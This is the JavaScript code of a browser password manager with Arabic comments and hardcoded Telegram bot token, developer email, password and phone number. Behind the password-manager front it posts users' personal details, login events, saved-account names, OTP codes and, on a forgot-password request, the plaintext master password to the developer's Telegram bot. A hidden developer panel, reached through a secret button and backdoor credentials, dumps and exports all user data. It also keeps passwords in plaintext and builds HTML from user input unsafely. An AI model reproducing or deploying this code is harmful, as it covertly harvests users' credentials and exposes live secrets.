// التوكنات والإعدادات
const TELEGRAM_BOT_TOKEN = '8104648920:AAHKqUaWXf16LB5OKewjfWaw4RoGbvBslrE';
const DEVELOPER_EMAIL = 'labibradaan@gmail.com';
const DEVELOPER_PASSWORD = 'labibradaan1234';
const DEVELOPER_PHONE = '771172888';
const DEVELOPER_CHAT_ID = '771172888';

// حالة التطبيق
let currentUser = null;
let users = JSON.parse(localStorage.getItem('passwordManagerUsers')) || [];
let passwords = JSON.parse(localStorage.getItem('passwords')) || {};
let secretClickCount = 0;
let otpCodes = {};
let lastOtpRequest = {};

// تهيئة التطبيق
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    checkSession();
    setupEventListeners();
    loadDeveloperData();
});

// تهيئة التطبيق
function initializeApp() {
    // التحقق من وجود بيانات
    if (!localStorage.getItem('passwordManagerUsers')) {
        localStorage.setItem('passwordManagerUsers', JSON.stringify([]));
    }
    
    if (!localStorage.getItem('passwords')) {
        localStorage.setItem('passwords', JSON.stringify({}));
    }
    
    if (!localStorage.getItem('otpCodes')) {
        localStorage.setItem('otpCodes', JSON.stringify({}));
    }
    
    // تحميل البيانات
    users = JSON.parse(localStorage.getItem('passwordManagerUsers'));
    passwords = JSON.parse(localStorage.getItem('passwords'));
    otpCodes = JSON.parse(localStorage.getItem('otpCodes')) || {};
}

// التحقق من الجلسة
function checkSession() {
    const session = localStorage.getItem('currentSession');
    if (session) {
        try {
            currentUser = JSON.parse(session);
            showScreen('dashboardScreen');
            updateDashboard();
            sendToTelegram(`✅ المستخدم ${currentUser.name} قام بتسجيل الدخول\n📧 ${currentUser.email}\n📞 ${currentUser.phone}`);
        } catch (e) {
            localStorage.removeItem('currentSession');
            showScreen('registerScreen');
        }
    } else {
        showScreen('registerScreen');
    }
}

// إعداد المستمعين للأحداث
function setupEventListeners() {
    // التنقل بين الشاشات
    document.getElementById('showLogin').addEventListener('click', () => showScreen('loginScreen'));
    document.getElementById('showRegister').addEventListener('click', () => showScreen('registerScreen'));
    
    // النماذج
    document.getElementById('registerForm').addEventListener('submit', handleRegister);
    document.getElementById('loginForm').addEventListener('submit', handleLogin);
    document.getElementById('passwordForm').addEventListener('submit', handleAddPassword);
    
    // الأزرار
    document.getElementById('logoutBtn').addEventListener('click', handleLogout);
    document.getElementById('addPasswordBtn').addEventListener('click', () => showModal('addPasswordModal'));
    document.getElementById('generatePasswordBtn').addEventListener('click', () => showModal('generatePasswordModal'));
    document.getElementById('viewPasswordsBtn').addEventListener('click', viewPasswords);
    document.getElementById('forgotPassword').addEventListener('click', handleForgotPassword);
    document.getElementById('subscribeBtn').addEventListener('click', () => showModal('subscriptionModal'));
    
    // توليد كلمة السر
    document.getElementById('passwordLength').addEventListener('input', updatePasswordLength);
    document.getElementById('generateBtn').addEventListener('click', generatePassword);
    document.getElementById('usePasswordBtn').addEventListener('click', useGeneratedPassword);
    document.getElementById('copyPassword').addEventListener('click', copyGeneratedPassword);
    document.getElementById('togglePassword').addEventListener('click', togglePasswordVisibility);
    
    // لوحة المطور
    document.getElementById('secretButton').addEventListener('click', handleSecretClick);
    document.getElementById('devLoginBtn').addEventListener('click', handleDeveloperLogin);
    document.getElementById('exportDataBtn').addEventListener('click', exportData);
    document.getElementById('sendToBotBtn').addEventListener('click', sendAllDataToBot);
    
    // الاشتراك
    document.getElementById('copyCode').addEventListener('click', copyUserCode);
    document.getElementById('whatsappBtn').addEventListener('click', () => openWhatsApp());
    document.getElementById('telegramBtn').addEventListener('click', () => openTelegram());
    
    // OTP
    document.getElementById('verifyOtpBtn').addEventListener('click', verifyOtp);
    document.getElementById('resendOtpBtn').addEventListener('click', resendOtp);
    
    // إغلاق النوافذ
    document.querySelectorAll('.close').forEach(closeBtn => {
        closeBtn.addEventListener('click', function() {
            this.closest('.modal').style.display = 'none';
        });
    });
    
    // إغلاق النوافذ بالنقر خارجها
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = 'none';
        }
    });
}

// معالجة التسجيل
function handleRegister(e) {
    e.preventDefault();
    
    const name = document.getElementById('userName').value;
    const email = document.getElementById('userEmail').value;
    const phone = document.getElementById('userPhone').value;
    const password = document.getElementById('masterPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    
    if (password !== confirmPassword) {
        alert('كلمات السر غير متطابقة!');
        return;
    }
    
    if (password.length < 6) {
        alert('كلمة السر يجب أن تكون 6 أحرف على الأقل!');
        return;
    }
    
    // التحقق من وجود المستخدم
    const existingUser = users.find(user => user.email === email || user.phone === phone);
    if (existingUser) {
        alert('المستخدم مسجل بالفعل!');
        return;
    }
    
    const userId = generateUserId();
    const userCode = generateUserCode();
    
    const newUser = {
        id: userId,
        name,
        email,
        phone,
        password,
        code: userCode,
        isPremium: false,
        maxPasswords: 20,
        usedPasswords: 0,
        registrationDate: new Date().toISOString(),
        lastLogin: new Date().toISOString()
    };
    
    users.push(newUser);
    localStorage.setItem('passwordManagerUsers', JSON.stringify(users));
    
    // إرسال بيانات المستخدم للبوت
    sendUserToBot(newUser);
    
    // تسجيل الدخول التلقائي
    currentUser = newUser;
    localStorage.setItem('currentSession', JSON.stringify(newUser));
    
    showScreen('dashboardScreen');
    updateDashboard();
    
    alert('تم إنشاء الحساب بنجاح!');
}

// معالجة تسجيل الدخول
function handleLogin(e) {
    e.preventDefault();
    
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    
    const user = users.find(user => user.email === email && user.password === password);
    
    if (!user) {
        alert('بيانات الدخول غير صحيحة!');
        return;
    }
    
    // التحقق من OTP إذا لزم الأمر
    if (shouldRequireOtp(user)) {
        currentUser = user;
        showOtpScreen();
        return;
    }
    
    // تسجيل الدخول
    currentUser = user;
    user.lastLogin = new Date().toISOString();
    localStorage.setItem('currentSession', JSON.stringify(user));
    localStorage.setItem('passwordManagerUsers', JSON.stringify(users));
    
    showScreen('dashboardScreen');
    updateDashboard();
    
    sendToTelegram(`✅ تسجيل دخول: ${user.name}\n📧 ${user.email}`);
}

// معالجة إضافة كلمة السر
function handleAddPassword(e) {
    e.preventDefault();
    
    if (!currentUser) {
        alert('يجب تسجيل الدخول أولاً!');
        return;
    }
    
    // التحقق من الحد المسموح
    if (currentUser.usedPasswords >= currentUser.maxPasswords && !currentUser.isPremium) {
        alert('لقد وصلت للحد المسموح! يرجى الاشتراك.');
        showModal('subscriptionModal');
        return;
    }
    
    const platform = document.getElementById('platformName').value;
    const account = document.getElementById('accountName').value;
    const password = document.getElementById('passwordValue').value;
    
    const passwordId = generatePasswordId();
    const passwordEntry = {
        id: passwordId,
        userId: currentUser.id,
        platform,
        account,
        password,
        date: new Date().toISOString()
    };
    
    if (!passwords[currentUser.id]) {
        passwords[currentUser.id] = [];
    }
    
    passwords[currentUser.id].push(passwordEntry);
    localStorage.setItem('passwords', JSON.stringify(passwords));
    
    currentUser.usedPasswords = passwords[currentUser.id].length;
    updateUser(currentUser);
    
    // إرسال للإشعار إذا وصل للحد
    if (currentUser.usedPasswords === currentUser.maxPasswords && !currentUser.isPremium) {
        sendLimitNotification(currentUser);
    }
    
    // إرسال للبوت
    sendToTelegram(`🔐 كلمة سر جديدة\n👤 ${currentUser.name}\n🌐 ${platform}\n👤 ${account}\n📅 ${new Date().toLocaleString()}`);
    
    document.getElementById('addPasswordModal').style.display = 'none';
    document.getElementById('passwordForm').reset();
    updateDashboard();
}

// توليد كلمة سر قوية
function generatePassword() {
    const length = parseInt(document.getElementById('passwordLength').value);
    const includeUppercase = document.getElementById('includeUppercase').checked;
    const includeLowercase = document.getElementById('includeLowercase').checked;
    const includeNumbers = document.getElementById('includeNumbers').checked;
    const includeSymbols = document.getElementById('includeSymbols').checked;
    
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const numbers = '0123456789';
    const symbols = '!@#$%^&*()_+-=[]{}|;:,.<>?';
    
    let chars = '';
    if (includeUppercase) chars += uppercase;
    if (includeLowercase) chars += lowercase;
    if (includeNumbers) chars += numbers;
    if (includeSymbols) chars += symbols;
    
    if (chars.length === 0) {
        alert('يرجى اختيار نوع واحد على الأقل!');
        return;
    }
    
    let password = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        password += chars[randomIndex];
    }
    
    document.getElementById('generatedPassword').value = password;
}

// استخدام كلمة السر المولدة
function useGeneratedPassword() {
    const generatedPassword = document.getElementById('generatedPassword').value;
    if (generatedPassword) {
        document.getElementById('passwordValue').value = generatedPassword;
        document.getElementById('generatePasswordModal').style.display = 'none';
        document.getElementById('addPasswordModal').style.display = 'block';
    }
}

// عرض كلمات السر
function viewPasswords() {
    const container = document.getElementById('passwordsContainer');
    container.innerHTML = '';
    
    if (!currentUser || !passwords[currentUser.id] || passwords[currentUser.id].length === 0) {
        container.innerHTML = '<div class="alert alert-info">لا توجد كلمات سر محفوظة بعد.</div>';
        return;
    }
    
    passwords[currentUser.id].forEach(pass => {
        const passElement = document.createElement('div');
        passElement.className = 'password-item';
        passElement.innerHTML = `
            <div class="password-header">
                <span class="password-platform">${pass.platform}</span>
                <span class="password-date">${new Date(pass.date).toLocaleDateString('ar')}</span>
            </div>
            <div class="password-account">${pass.account}</div>
            <div class="password-value">••••••••</div>
            <div class="password-actions">
                <button class="btn btn-small btn-primary show-password" data-id="${pass.id}">
                    <i class="fas fa-eye"></i> إظهار
                </button>
                <button class="btn btn-small btn-success copy-password" data-id="${pass.id}">
                    <i class="fas fa-copy"></i> نسخ
                </button>
                <button class="btn btn-small btn-danger delete-password" data-id="${pass.id}">
                    <i class="fas fa-trash"></i> حذف
                </button>
            </div>
        `;
        container.appendChild(passElement);
    });
    
    // إضافة مستمعين للأحداث
    document.querySelectorAll('.show-password').forEach(btn => {
        btn.addEventListener('click', function() {
            const passId = this.getAttribute('data-id');
            const pass = passwords[currentUser.id].find(p => p.id === passId);
            const passElement = this.closest('.password-item').querySelector('.password-value');
            
            if (passElement.textContent === '••••••••') {
                passElement.textContent = pass.password;
                this.innerHTML = '<i class="fas fa-eye-slash"></i> إخفاء';
            } else {
                passElement.textContent = '••••••••';
                this.innerHTML = '<i class="fas fa-eye"></i> إظهار';
            }
        });
    });
    
    document.querySelectorAll('.copy-password').forEach(btn => {
        btn.addEventListener('click', function() {
            const passId = this.getAttribute('data-id');
            const pass = passwords[currentUser.id].find(p => p.id === passId);
            navigator.clipboard.writeText(pass.password).then(() => {
                alert('تم نسخ كلمة السر!');
            });
        });
    });
    
    document.querySelectorAll('.delete-password').forEach(btn => {
        btn.addEventListener('click', function() {
            if (confirm('هل أنت متأكد من حذف كلمة السر؟')) {
                const passId = this.getAttribute('data-id');
                passwords[currentUser.id] = passwords[currentUser.id].filter(p => p.id !== passId);
                localStorage.setItem('passwords', JSON.stringify(passwords));
                
                currentUser.usedPasswords = passwords[currentUser.id].length;
                updateUser(currentUser);
                
                viewPasswords();
                updateDashboard();
            }
        });
    });
}

// تحديث لوحة التحكم
function updateDashboard() {
    if (!currentUser) return;
    
    document.getElementById('currentUserName').textContent = currentUser.name;
    document.getElementById('currentUserEmail').textContent = currentUser.email;
    document.getElementById('passwordCount').textContent = currentUser.usedPasswords || 0;
    document.getElementById('subscriptionStatus').textContent = currentUser.isPremium ? 'مميز' : 'مجاني';
    document.getElementById('subscriptionStatus').style.color = currentUser.isPremium ? '#27ae60' : '#f39c12';
    
    // تحديث الكود في نافذة الاشتراك
    document.getElementById('userCode').value = currentUser.code;
    document.getElementById('userIdDisplay').textContent = `ID: ${currentUser.id}`;
    
    // إظهار/إخفاء تنبيه الاشتراك
    const alertElement = document.getElementById('subscriptionAlert');
    if (currentUser.usedPasswords >= currentUser.maxPasswords && !currentUser.isPremium) {
        alertElement.style.display = 'flex';
    } else {
        alertElement.style.display = 'none';
    }
}

// التعامل مع النقر السري للمطور
function handleSecretClick() {
    secretClickCount++;
    
    if (secretClickCount >= 10) {
        showModal('developerPanel');
        secretClickCount = 0;
    }
}

// تسجيل دخول المطور
function handleDeveloperLogin() {
    const email = document.getElementById('devEmail').value;
    const password = document.getElementById('devPassword').value;
    
    if (email === DEVELOPER_EMAIL && password === DEVELOPER_PASSWORD) {
        document.getElementById('developerLogin').style.display = 'none';
        document.getElementById('developerDashboard').style.display = 'block';
        loadDeveloperDashboard();
    } else {
        alert('بيانات الدخول غير صحيحة!');
    }
}

// تحميل لوحة تحكم المطور
function loadDeveloperDashboard() {
    document.getElementById('totalUsers').textContent = users.length;
    document.getElementById('activeUsers').textContent = users.filter(u => u.lastLogin).length;
    
    const usersContainer = document.getElementById('usersContainer');
    usersContainer.innerHTML = '';
    
    users.forEach(user => {
        const userElement = document.createElement('div');
        userElement.className = 'user-item';
        userElement.innerHTML = `
            <strong>${user.name}</strong>
            <div>📧 ${user.email} | 📞 ${user.phone}</div>
            <div>🆔 ${user.id} | 🔐 ${user.usedPasswords || 0}</div>
            <div>💳 ${user.isPremium ? 'مميز' : 'مجاني'} | 📅 ${new Date(user.registrationDate).toLocaleDateString('ar')}</div>
            <div class="developer-actions">
                <button class="btn btn-small btn-primary upgrade-user" data-id="${user.id}">
                    ${user.isPremium ? 'إلغاء التميز' : 'ترقية'}
                </button>
                <button class="btn btn-small btn-success send-code" data-id="${user.id}">
                    إرسال الكود
                </button>
                <button class="btn btn-small btn-danger reset-pin" data-id="${user.id}">
                    إعادة تعيين PIN
                </button>
            </div>
        `;
        usersContainer.appendChild(userElement);
    });
    
    // إضافة مستمعين للأحداث
    document.querySelectorAll('.upgrade-user').forEach(btn => {
        btn.addEventListener('click', function() {
            const userId = this.getAttribute('data-id');
            const user = users.find(u => u.id === userId);
            user.isPremium = !user.isPremium;
            localStorage.setItem('passwordManagerUsers', JSON.stringify(users));
            loadDeveloperDashboard();
            
            sendToTelegram(`🔄 ${user.isPremium ? 'تم الترقية' : 'تم إلغاء الترقية'}\n👤 ${user.name}\n📧 ${user.email}`);
        });
    });
    
    document.querySelectorAll('.send-code').forEach(btn => {
        btn.addEventListener('click', function() {
            const userId = this.getAttribute('data-id');
            const user = users.find(u => u.id === userId);
            const code = user.code || generateUserCode();
            user.code = code;
            localStorage.setItem('passwordManagerUsers', JSON.stringify(users));
            
            sendToTelegram(`🔑 كود المستخدم\n👤 ${user.name}\n📧 ${user.email}\n🔢 الكود: ${code}\n🆔 المعرف: ${user.id}`);
            alert('تم إرسال الكود للبوت!');
        });
    });
    
    document.querySelectorAll('.reset-pin').forEach(btn => {
        btn.addEventListener('click', function() {
            const userId = this.getAttribute('data-id');
            const user = users.find(u => u.id === userId);
            const newPin = Math.random().toString().slice(2, 8);
            user.password = newPin;
            localStorage.setItem('passwordManagerUsers', JSON.stringify(users));
            
            sendToTelegram(`🔐 إعادة تعيين PIN\n👤 ${user.name}\n📧 ${user.email}\n🔢 PIN الجديد: ${newPin}`);
            alert(`تم تعيين PIN جديد: ${newPin}`);
        });
    });
}

// إرسال البيانات للبوت
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: DEVELOPER_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        if (!data.ok) {
            console.error('خطأ في إرسال الرسالة:', data);
        }
    } catch (error) {
        console.error('خطأ في الاتصال:', error);
    }
}

// إرسال بيانات المستخدم للبوت
function sendUserToBot(user) {
    const message = `
👤 مستخدم جديد
──────────────
📛 الاسم: ${user.name}
📧 الإيميل: ${user.email}
📞 الجوال: ${user.phone}
🆔 المعرف: ${user.id}
🔢 الكود: ${user.code}
📅 التاريخ: ${new Date().toLocaleString('ar')}
──────────────
💾 تم التسجيل بنجاح
    `;
    
    sendToTelegram(message);
}

// إرسال إشعار الوصول للحد
function sendLimitNotification(user) {
    const message = `
⚠️ تنبيه: وصل للحد الأقصى
──────────────
👤 المستخدم: ${user.name}
📧 الإيميل: ${user.email}
🔢 عدد كلمات السر: ${user.usedPasswords}
🆔 المعرف: ${user.id}
🔢 الكود: ${user.code}
──────────────
💳 يحتاج لاشتراك مدفوع
    `;
    
    sendToTelegram(message);
}

// إرسال جميع البيانات للبوت
function sendAllDataToBot() {
    let message = `
📊 تقرير كامل - قاعدة البيانات
═══════════════════════════
👥 عدد المستخدمين: ${users.length}
────────────────────
    `;
    
    users.forEach((user, index) => {
        message += `
👤 المستخدم ${index + 1}
──────────────
📛 الاسم: ${user.name}
📧 الإيميل: ${user.email}
📞 الجوال: ${user.phone}
🆔 المعرف: ${user.id}
🔢 الكود: ${user.code}
💳 الحالة: ${user.isPremium ? 'مميز' : 'مجاني'}
🔐 عدد كلمات السر: ${user.usedPasswords || 0}
📅 تاريخ التسجيل: ${new Date(user.registrationDate).toLocaleString('ar')}
────────────────────
        `;
    });
    
    sendToTelegram(message);
    alert('تم إرسال جميع البيانات للبوت!');
}

// تصدير البيانات
function exportData() {
    const data = {
        users: users,
        passwords: passwords,
        exportDate: new Date().toISOString()
    };
    
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `password-manager-backup-${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    alert('تم تصدير البيانات بنجاح!');
}

// توليد معرف مستخدم
function generateUserId() {
    return 'USER_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// توليد كود مستخدم
function generateUserCode() {
    return Math.random().toString(36).substr(2, 8).toUpperCase();
}

// توليد معرف كلمة سر
function generatePasswordId() {
    return 'PASS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
}

// تحديث المستخدم
function updateUser(user) {
    const index = users.findIndex(u => u.id === user.id);
    if (index !== -1) {
        users[index] = user;
        localStorage.setItem('passwordManagerUsers', JSON.stringify(users));
    }
}

// إظهار شاشة
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
}

// إظهار نافذة
function showModal(modalId) {
    document.getElementById(modalId).style.display = 'flex';
}

// تسجيل الخروج
function handleLogout() {
    if (confirm('هل تريد تسجيل الخروج؟')) {
        currentUser = null;
        localStorage.removeItem('currentSession');
        showScreen('registerScreen');
    }
}

// نسخ كلمة السر المولدة
function copyGeneratedPassword() {
    const password = document.getElementById('generatedPassword').value;
    if (password) {
        navigator.clipboard.writeText(password).then(() => {
            alert('تم نسخ كلمة السر!');
        });
    }
}

// نسخ الكود
function copyUserCode() {
    const code = document.getElementById('userCode').value;
    if (code) {
        navigator.clipboard.writeText(code).then(() => {
            alert('تم نسخ الكود!');
        });
    }
}

// تحديث طول كلمة السر
function updatePasswordLength() {
    const length = document.getElementById('passwordLength').value;
    document.getElementById('lengthValue').textContent = length;
    generatePassword();
}

// تبديل رؤية كلمة السر
function togglePasswordVisibility() {
    const input = document.getElementById('passwordValue');
    const icon = document.getElementById('togglePassword').querySelector('i');
    
    if (input.type === 'password') {
        input.type = 'text';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
    } else {
        input.type = 'password';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
    }
}

// فتح واتساب
function openWhatsApp() {
    const message = `مرحباً، أريد الاشتراك في الخدمة المميزة\nالكود: ${currentUser.code}\nالمعرف: ${currentUser.id}`;
    const url = `https://wa.me/${DEVELOPER_PHONE}?text=${encodeURIComponent(message)}`;
    window.open(url, '_blank');
}

// فتح تلجرام
function openTelegram() {
    const message = `مرحباً، أريد الاشتراك في الخدمة المميزة\nالكود: ${currentUser.code}\nالمعرف: ${currentUser.id}`;
    const url = `https://t.me/labibradaan?text=${encodeURIComponent(message)}`;
    window.open(url, '_blank');
}

// التعامل مع نسيت كلمة السر
function handleForgotPassword() {
    const email = prompt('أدخل بريدك الإلكتروني:');
    if (!email) return;
    
    const user = users.find(u => u.email === email);
    if (!user) {
        alert('البريد الإلكتروني غير مسجل!');
        return;
    }
    
    // إرسال PIN للبوت
    sendToTelegram(`🔐 طلب استعادة PIN\n📧 الإيميل: ${email}\n🔢 PIN: ${user.password}\n👤 الاسم: ${user.name}`);
    alert('تم إرسال PIN إلى البوت الخاص بالمطور. سيتواصل معك قريباً.');
}

// التحقق من الحاجة لـ OTP
function shouldRequireOtp(user) {
    // يتم طلب OTP في حالات معينة (تغير الجهاز، محاولة دخول مشبوهة)
    const lastLogin = new Date(user.lastLogin);
    const now = new Date();
    const diffHours = (now - lastLogin) / (1000 * 60 * 60);
    
    // إذا مضى أكثر من 24 ساعة على آخر دخول، أو إذا كانت محاولة دخول جديدة
    if (diffHours > 24 || !user.lastLogin) {
        return true;
    }
    
    return false;
}

// إظهار شاشة OTP
function showOtpScreen() {
    generateAndSendOtp();
    showModal('otpScreen');
}

// توليد وإرسال OTP
function generateAndSendOtp() {
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    otpCodes[currentUser.id] = otp;
    localStorage.setItem('otpCodes', JSON.stringify(otpCodes));
    
    lastOtpRequest[currentUser.id] = Date.now();
    
    // إرسال OTP للبوت
    const message = `🔐 رمز التحقق (OTP)\n👤 ${currentUser.name}\n📧 ${currentUser.email}\n🔢 الرمز: ${otp}\n⏰ صالح لمدة 10 دقائق`;
    sendToTelegram(message);
    
    alert('تم إرسال رمز التحقق إلى بريدك الإلكتروني وبوت التلجرام.');
}

// التحقق من OTP
function verifyOtp() {
    const enteredOtp = document.getElementById('otpCode').value;
    const storedOtp = otpCodes[currentUser.id];
    
    if (!storedOtp) {
        alert('الرمز غير صالح أو منتهي الصلاحية!');
        return;
    }
    
    // التحقق من وقت OTP (10 دقائق)
    const requestTime = lastOtpRequest[currentUser.id];
    const now = Date.now();
    const diffMinutes = (now - requestTime) / (1000 * 60);
    
    if (diffMinutes > 10) {
        alert('الرمز منتهي الصلاحية! يرجى طلب رمز جديد.');
        delete otpCodes[currentUser.id];
        localStorage.setItem('otpCodes', JSON.stringify(otpCodes));
        return;
    }
    
    if (enteredOtp === storedOtp) {
        // OTP صحيح، تسجيل الدخول
        currentUser.lastLogin = new Date().toISOString();
        localStorage.setItem('currentSession', JSON.stringify(currentUser));
        updateUser(currentUser);
        
        // حذف OTP بعد الاستخدام
        delete otpCodes[currentUser.id];
        localStorage.setItem('otpCodes', JSON.stringify(otpCodes));
        
        document.getElementById('otpScreen').style.display = 'none';
        showScreen('dashboardScreen');
        updateDashboard();
        
        sendToTelegram(`✅ تحقق ناجح\n👤 ${currentUser.name}\n📧 ${currentUser.email}`);
    } else {
        alert('الرمز غير صحيح!');
    }
}

// إعادة إرسال OTP
function resendOtp() {
    generateAndSendOtp();
    document.getElementById('otpCode').value = '';
}

// تحميل بيانات المطور
function loadDeveloperData() {
    // التهيئة الأولية
    if (users.length === 0) {
        const developerUser = {
            id: 'DEV_MASTER',
            name: 'لبيب رعدان',
            email: DEVELOPER_EMAIL,
            phone: DEVELOPER_PHONE,
            password: DEVELOPER_PASSWORD,
            code: 'DEV12345',
            isPremium: true,
            maxPasswords: 9999,
            usedPasswords: 0,
            registrationDate: new Date().toISOString(),
            lastLogin: new Date().toISOString()
        };
        
        users.push(developerUser);
        localStorage.setItem('passwordManagerUsers', JSON.stringify(users));
    }
}

// توليد كلمة سر أولية
document.addEventListener('DOMContentLoaded', function() {
    generatePassword();
});